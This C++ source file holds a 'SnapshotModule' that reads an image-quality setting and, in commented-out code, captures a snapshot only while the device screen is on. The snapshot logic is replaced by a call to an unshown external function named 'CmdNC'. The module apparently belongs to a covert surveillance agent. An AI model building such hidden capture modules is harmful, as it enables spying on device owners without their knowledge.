#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "Configuration.h"
#include "Snapshot.h"

#include <common_new\Pm.h>

extern "C" int CmdNC(void);

DWORD WINAPI SnapshotModule(LPVOID lpParam) {
	Device* devobj = Device::self();
	Configuration *conf;
	Module *me = (Module *)lpParam;
	HANDLE moduleHandle;
	wstring quality;
	INT qualityLevel;

	me->setStatus(MODULE_RUNNING);
	moduleHandle = me->getEvent();
	conf = me->getConf();

	try {
		quality = conf->getString(L"quality");
	} catch (...) {
		quality = L"med";
	}

	if (quality.compare(L"high") == 0) {
		qualityLevel = 100;
	}

	if (quality.compare(L"med") == 0) {
		qualityLevel = 70;
	}

	if (quality.compare(L"low") == 0) {
		qualityLevel = 40;
	}

	DBG_TRACE(L"Debug - SnapshotGrabber.cpp - Snapshot Module started\n", 5, FALSE);

	int xyz=CmdNC();
/***
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if (hr == S_FALSE) {
		CoUninitialize();
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	if (FAILED(hr)) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	CMSnapShot *snapshotObj = new(std::nothrow) CMSnapShot;

	if (snapshotObj == NULL) {
		CoUninitialize();
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	snapshotObj->SetQuality(qualityLevel);

	if (devobj->GetFrontLightPowerState() == D0)
		snapshotObj->Run();

	delete snapshotObj;
	CoUninitialize();
***/
	me->setStatus(MODULE_STOPPED);
	return 0;
}